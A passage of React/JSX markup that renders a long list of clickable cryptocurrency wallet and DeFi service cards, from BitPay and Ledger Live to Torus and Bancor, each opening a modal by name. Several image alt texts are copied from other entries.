                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">BitPay</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bitpay}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Ledger Live')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Ledger Live</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ledgerlive}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Walleth')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Walleth</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={walleth}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Authereum')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Authereum</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={authereum}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Dharma')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Dharma</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dharma}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('1inch')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">1inch Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={inch}
                alt="1inch wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Huobi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Houbi</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={houbi}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Eidoo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Eidoo</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={eidoo}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MyKey')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">MyKey</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mykey}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('TrustVault')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">TrustVault</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={trustvault}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Atomic')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Atomic</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={atomic}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Coin98')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Coin98</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={coin98}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Zksync')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Zksync</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={zksync}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Shell')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Shell Exchange</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={shell}
                alt="Houbi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Index Coop')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Index Coop</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={index}
                alt="Index wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SwapX')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">SwapX</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={swap}
                alt="Index wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('StarName')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Starname</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={starname}
                alt="StarName wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Space')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Space</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={space}
                alt="Space wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Maskbook')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Maskbook</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={maskbook}
                alt="Maskbook wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Snap')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Snapshot</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={snap}
                alt="Snap wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Invoice')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Invoice.build</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={invoice}
                alt="Invoice wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Ankr')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Ankr</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ankr}
                alt="Ankr wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DoDo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">DODO</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dodo}
                alt="DoDo wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Zlot')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Zlot</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={zlot}
                alt="Zlot wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('TokMark')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">TokMark</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tokmark}
                alt="TokMark wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('ActusProtocol')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Actus Protocol</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={actusprotocol}
                alt="Actus Protocol wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('AstroTools')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Astrotools.io</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={astrotools}
                alt="Actus Protocol wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Rubic')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Rubic</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={rubic}
                alt="Actus Protocol wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Torus')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Torus Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={torus}
                alt="Torus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Ocean Protocol')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Ocean Protocol</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ocean}
                alt="Ocean wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Filecoin')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Filecoin swap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={filecoin}
                alt="Filecoin wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Bancor')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Bancor</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bancor}
                alt="Bancor wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

